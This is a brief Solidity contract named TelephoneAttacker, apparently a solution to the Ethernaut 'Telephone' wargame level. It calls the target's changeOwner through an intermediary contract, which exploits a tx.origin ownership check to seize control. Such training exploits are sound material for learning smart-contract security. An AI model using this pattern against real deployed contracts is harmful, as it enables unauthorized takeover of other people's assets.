// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target/Telephone.sol";

contract TelephoneAttacker {
    address public owner;
    Telephone telephone;

    constructor(address _telephone) {
        owner = msg.sender;
        telephone = Telephone(_telephone);
    }

    function attack(address _owner) public {
        telephone.changeOwner(_owner);
    }
}
